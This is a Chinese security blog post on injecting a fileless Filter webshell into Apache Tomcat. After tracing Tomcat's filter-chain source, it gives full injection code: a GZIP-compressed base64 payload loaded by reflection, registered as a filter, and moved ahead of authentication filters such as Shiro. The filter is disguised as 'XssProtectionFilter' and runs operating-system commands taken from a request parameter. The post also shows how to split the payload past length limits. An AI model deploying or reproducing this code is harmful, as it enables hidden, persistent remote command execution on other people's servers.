---
typora-root-url: ../../../static
title: "Tomcat之Filter内存马"
date: 2021-06-01T09:07:36+08:00
draft: false
categories: ["security"]
---

## 前置知识
阅读本篇文章前需要掌握[《Tomcat架构原理》][l1]。

## 分析
根据《Tomcat架构原理》中提到：**Wrapper容器的最后一个Valve会创建一个Filter链，并调用doFileter方法，最终会调到Servlet的service方法。** 。那我们跟踪一下StandardWrapperValve类，找到其创建FilterChain的代码进行分析，如下所示：

	// 代码位置：StandardWrapperValve类
    // Create the filter chain for this request
    ApplicationFilterChain filterChain =
            ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);

可以看到，是调用ApplicationFilterFactory#createFilterChain()方法来创建过滤器链，继续跟进：

	// 代码位置ApplicationFilterFactory#createFilterChain()
	public static ApplicationFilterChain createFilterChain(ServletRequest request,
	        Wrapper wrapper, Servlet servlet) {
	
	    // 如果没有要执行的Servlet，则直接返回null
	    if (servlet == null)
	        return null;
	
	    // 初始化FilterChain对象
	    ApplicationFilterChain filterChain = null;
	    if (request instanceof Request) {
	        Request req = (Request) request;
	        if (Globals.IS_SECURITY_ENABLED) {
	            // Security: Do not recycle
	            filterChain = new ApplicationFilterChain();
	        } else {
	            filterChain = (ApplicationFilterChain) req.getFilterChain();
	            if (filterChain == null) {
	                filterChain = new ApplicationFilterChain();
	                req.setFilterChain(filterChain);
	            }
	        }
	    } else {
	        // Request dispatcher in use
	        filterChain = new ApplicationFilterChain();
	    }
	
	    filterChain.setServlet(servlet);
	    filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());
	
	    // 重点：从context中获取filterMaps
	    StandardContext context = (StandardContext) wrapper.getParent();
	    FilterMap filterMaps[] = context.findFilterMaps();
	
	    // 如果没有filterMaps，则直接返回filterChain了，不做其他操作了
		// 空的filterChain不会做任何过滤操作
	    if ((filterMaps == null) || (filterMaps.length == 0))
	        return filterChain;
	
	    // Acquire the information we will need to match filter mappings
	    DispatcherType dispatcher =
	            (DispatcherType) request.getAttribute(Globals.DISPATCHER_TYPE_ATTR);
	
	    String requestPath = null;
	    Object attribute = request.getAttribute(Globals.DISPATCHER_REQUEST_PATH_ATTR);
	    if (attribute != null){
	        requestPath = attribute.toString();
	    }
	
	    String servletName = wrapper.getName();
	
	    // Add the relevant path-mapped filters to this filter chain
		// 遍历filterMaps，从filterMap中获取各个Filter的拦截路径，与当前请求路径requestPath进行匹配
	    for (int i = 0; i < filterMaps.length; i++) {
			// 对比当前遍历的filterMap的请求方式与当前请求的请求方式（FORWARD、INCLUDE、REQUEST、ASYNCERROR）
	        if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
	            continue;
	        }
			// 对比当前遍历的filterMap的拦截路径与当前请求的请求路径
	        if (!matchFiltersURL(filterMaps[i], requestPath))
	            continue;
			// 重点：从context中获取filterConfig
	        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
	            context.findFilterConfig(filterMaps[i].getFilterName());
	        if (filterConfig == null) {
	            // FIXME - log configuration problem
	            continue;
	        }
			// 将filterConfig添加到filterChain中
	        filterChain.addFilter(filterConfig);
	    }
	
	    // 下面就是根据servletName匹配Filter（Filter可以根据servletName进行拦截）
	    for (int i = 0; i < filterMaps.length; i++) {
	        if (!matchDispatcher(filterMaps[i] ,dispatcher)) {
	            continue;
	        }
	        if (!matchFiltersServlet(filterMaps[i], servletName))
	            continue;
	        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)
	            context.findFilterConfig(filterMaps[i].getFilterName());
	        if (filterConfig == null) {
	            // FIXME - log configuration problem
	            continue;
	        }
	        filterChain.addFilter(filterConfig);
	    }
	
	    // 最后返回添加了filterConfig的filterChain
	    return filterChain;
	}

总结一下，创建过滤器链，要使得链内的过滤器起作用，需要在过滤器链中添加filterConfig，但是在此之前，需要先从context中拿到filterMap进行请求路径匹配对比。所以，我们目前至少知道，注入一个Filter，我们需要往context中先后注入filterMap以及filterConfig。

这里我们使用的是StandardContext类，该类提供了开放的addFilterMap()可以添加filterMap，没有提供开放的方法添加filterConfig，但是可以通过反射进行添加。

首先在StandardContext中添加filterMap，跟进StardardContxt#addFilterMap()，代码如下：

    public void addFilterMap(FilterMap filterMap) {
		// 添加FilterMap之前，先调用validateFilterMap检验此FilterMap
        validateFilterMap(filterMap);
        // Add this filter mapping to our registered set
        filterMaps.add(filterMap);
        fireContainerEvent("addFilterMap", filterMap);
    }

继续跟进StandardContext#validateFilterMap()，关键代码如下：

    private void validateFilterMap(FilterMap filterMap) {
        // Validate the proposed filter mapping
        String filterName = filterMap.getFilterName();
        String[] servletNames = filterMap.getServletNames();
        String[] urlPatterns = filterMap.getURLPatterns();
		// 如果StandardContext.filterDefs中，找不到filterMap中的filterName则直接抛出异常了
        if (findFilterDef(filterName) == null)
            throw new IllegalArgumentException
                (sm.getString("standardContext.filterMap.name", filterName));
		// 省略以下代码...
	}

所以，要调用StandardContext#addFilterMap()添加filterMap，还需要在此之前在StandardContext添加相关的filterDef。于是整理下注入Filter内存马得思路：

1. 先利用ContextClassLoader#defineClass()注入Filter内存马类定义，此时只是注入了类定义，还不会起作用。
2. 调用StandardContext#addFilterDef()添加filterDef，其中filterDef的filter属性即为利用反射实例化的内存马对象。
3. 再调用StandardContext#addFilterMap()中添加filterMap。
4. 然后通过反射往StandardContext中添加filterConfig。
5. 最后，不要忘记调整Filter内存马的filterMap顺序为filterMaps的第一个，因为Tomcat的过滤器的过滤顺序是根据filterMaps的顺序来的，防止我们注入的Filter内存马被类似shiro等身份验证的filter提前结束请求，而执行不了的情况，我们需要将我们注入的 Filter内存马顺序调整到第一位。

Notice：filterName均保持一致。

于是可以得到如下整体的内存马注入代码：

    String filterName="xssProtectionFilter";
    java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
    java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass",new Class[] {byte[].class, int.class, int.class});
    defineClass.setAccessible(true);
	// 这是经过GZIP压缩后的恶意Filter的字节码
    String evalBase64 = "H4sIAAAAAAAAAKVWWXvTRhQ9420UWWwmIbhhp4ADJIZSoNiUQsPaJiHFNJCELooyiQW2ZCSZJHShLd330jV0+/pSXtsXQ9qvLS/hoT8Kekc2rhM7Kd/Xlxnp3rn3njlz7kh/3/3tTwCP4kcV69DPcYbjrIKBKAIYVDCk4hyeUxHF8wpekPOLHLqCYQWGghEFQsGoijFk5WCqOI8LHDkVzcgrsORsy6Egh4sKnCiCcFV4KMrhUhTjmOCY5LjM8RJDZL9pmd4BhmCivZ8h1GWPCIYl3aYleov5YeGc1odzZIl124ae69cdU75XjCEva7oMLd1nXbfPsT1heKZtHTVznnDS5JapGdYmus/rl/SJpCucSznhJcsLumxr1BxLy6raaI2FYdVC6xnUIxOGKMhKLsfLDEt7hJe1R/p0R88LWkiIlBG7HMQwNLd6pjyfEheLwvXS83ndAuUXc90VKFndtHzk3HSJquIEAxtkCNvu6cmCJEtGJXO6NZbMeI5pSdghIz9C0JYPNXIGTEvy6HtMO3nCKhQ9cgo9T04mw8q+omfmkhlDtyyf4Yhd9Ggl4XDK22FYs/B2iRunsjc6mf/YPEN09N8NM7QtwAYpiDAwbJmzJut5heRxGuqAhCQQhrnnUx9QRbMo4+nGhR694OvPV/ErHK9yXCm3EXUKx16O16gjOF4nWkaolGNPkmgydtExBCGmfa9soNdOiULDBmxk2PRAW2DY/GDI6ZwKO619uxwNb+AqobLdTou0yvGmhrdwVcPbeIf4GzctDe/iPZL0XImQQtwsDR0GrSMhURIaO8UEJQ8kDY73NXyADzV8hI85PtHwKT5jWFanGbnBaxRy7pCGz/GFhi/xlYavZXlo+AZTHNc1fIvvNHyPjUSshh34geTXgLFZME8OnycfQ3MjhZAqGwqt2sjU8wuplmH1gkJliM8rTMLeoKtqrSdrYGhjwqteJHTAifpmbW/Uv7UHNul6ggpEZSrHLgjHI/1FPbvbHidMuoTbnGiYRTFsyyPM1O9ttZVpI05GUmEZIt0+eP9gfd+pouWZecqpUr3qS8usAhWz7DlSDEkokWhwC9VGEHBDuG56VqmKkWExlZpFZuv9cnV318pEQ4d/6xddcVjkzLzpc71lfq7n3Ho8q7u9YsLzP1rERsjyX5oI1RmnnKwWUB+lqjjSNedeY6abe1w+SN4agCCs4dFcUTbgwf/3NWnvx3qspe8+oxkI0UwXDo0P01uSZmpDhLfeBPuVHgLYRGPEN6rYDNmi/gJsQYJmhnZspc+7DN7tr0d9oOYHrig7K4HyaRu209hRQdFJ1SmxNEvnDuws52W/UDWNbDPbbiOQCm2/jWAqHA/FQtMIB3AHN0J7IrHILfAUj/M7WB7nJSixphLUKUSCeyItkSmsi/yB6EAwpmUGQrFFmQEZv9iPz9zA6opziXQuneVMKbewLK6UECthearpdzQPxJtuoiW2ooTWlBpXS1g5haic4zcQjj2UisbD02ij6yBawqrKcwmrO7Ztn8aaICQ3wRpuFvvcXKYNtuEnPIJdZN+A6/RzthscRRzDHuyFQrd2Co9hH5pwjQhPIU3H8TNxup/WRSU5VV5n8DgO+Lln8AQO+qzP4BCepLoR/IUuHCa+NUzjCI4StcfI34PIPVmG4zjHCY6nOJ7m6OboYRy9wPoBjpN30UkjRx/HM4fIfA+tiNRHULoOf3sBnKoc6qIgYQKhAeGQh5upKq582A1Es7RGbayqttP+qmf/AQeK/3vCCgAA";
    byte[] evalBytes = java.util.Base64.getDecoder().decode(evalBase64);
    java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
    java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
    java.util.zip.GZIPInputStream gzipInputStream = new java.util.zip.GZIPInputStream(byteInputStream);
    byte[] buffer = new byte[1024];
    for (int i=-1;(i=gzipInputStream.read(buffer)) >0;){
        byteOutputStream.write(buffer,0,i);
    }
    byte[] bytes = byteOutputStream.toByteArray();
    // ① 先加载Filter内存马
    defineClass.invoke(classLoader, new Object[] {bytes, 0, bytes.length});
    //===================可以以此为界限，分段发送payload===================
    // ② 获取StandardContext
    org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
    org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext)standardroot.getContext();
    // ③ 向standardcontext注册内存马
    // 添加filterDef，先前已注入恶意Filter类，可调用Class.forName()获取
    javax.servlet.Filter pingerFilter = (javax.servlet.Filter) Class.forName("XssProtectionFilter").newInstance();
    org.apache.tomcat.util.descriptor.web.FilterDef filterDef = new org.apache.tomcat.util.descriptor.web.FilterDef();
    //可自行命名
    filterDef.setFilterName(filterName);
    filterDef.setFilter(pingerFilter);
    standardContext.addFilterDef(filterDef);
    // 实例化filterMap，filterMap#setFilterName()和filterMap#addURLPattern()都是public方法
    org.apache.tomcat.util.descriptor.web.FilterMap filterMap = new org.apache.tomcat.util.descriptor.web.FilterMap();
    filterMap.setFilterName(filterName);
    filterMap.addURLPattern("/*");
    standardContext.addFilterMap(filterMap);
    // 反射获取filterConfigs
    Class<StandardContext> clazz = StandardContext.class;
    java.lang.reflect.Field filterConfigsF = clazz.getDeclaredField("filterConfigs");
    filterConfigsF.setAccessible(true);
    java.util.Map filterConfigs = (java.util.Map) filterConfigsF.get(standardContext);
    // 由于ApplicationFilterConfig经Final修饰，且构造方法为静态方法，无法通过new实例化，需通过反射获取ApplicationFilterConfig构造方法并实例化后添加入filterConfigs
    java.lang.reflect.Constructor constructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    filterConfigs.put(filterName, constructor.newInstance(new Object[]{standardContext, filterDef}));
    // 修改filterMap的顺序，防止注入的内存马被程序的前置filter拦截
    Object[] filterMaps = standardContext.findFilterMaps();
    Object[] tmpFilterMaps = new Object[filterMaps.length];
    int index = 1;
    for (int i = 0; i < filterMaps.length; i++)
    {
        org.apache.tomcat.util.descriptor.web.FilterMap f = (org.apache.tomcat.util.descriptor.web.FilterMap) filterMaps[i];
        if (f.getFilterName().equalsIgnoreCase(filterName)) {
            tmpFilterMaps[0] = f;
        } else {
            tmpFilterMaps[index++] = f;
        }
    }
    for (int i = 0; i < filterMaps.length; i++) {
        filterMaps[i] = tmpFilterMaps[i];
    }

Filter的代码如下所示：

	public class XssProtectionFilter implements Filter {
	    @Override
	    public void init(FilterConfig filterConfig) throws ServletException { }
	    @Override
	    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
			HttpServletRequest req = (HttpServletRequest) request;
        	HttpServletResponse resp = (HttpServletResponse) response;
	        String cmd=req.getParameter("p1n93r");
	        if ( != null) {
	            boolean isLinux = true;
	            String osTyp = System.getProperty("os.name");
	            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
	                isLinux = false;
	            }
	            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
	            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
	            Scanner s = new Scanner(in).useDelimiter("\\A");
	            String output = s.hasNext() ? s.next() : "";
	            resp.getWriter().write(output);
	            resp.getWriter().flush();
	        }
	        filterChain.doFilter(request, response);
		}
	    @Override
	    public void destroy(){}
	}

将XssProtectionFilter类的字节码压缩后base64存储，得到最开始代码中的evalBase64：

    public static void main(String[] args) throws IOException {
        InputStream in = Test.class.getClassLoader().getResourceAsStream("XssProtectionFilter.class");
        byte[] bytes = new byte[in.available()];
        in.read(bytes);
        // 将字节压缩下
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream=new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(bytes);
        gzipOutputStream.close();
        System.out.println(java.util.Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
    }

利用本文的方法，GZIP压缩以及分两次发送payload，即可绕过Tomcat对payload的长度限制。同时，最后对filterMap的顺序修改，可以绕过shiro的过滤器提前拦截的问题。最终得到的效果如下图所示：

![Filter内存马效果][p1]




[l1]:https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/
[p1]:/media/2021-06-01-01.png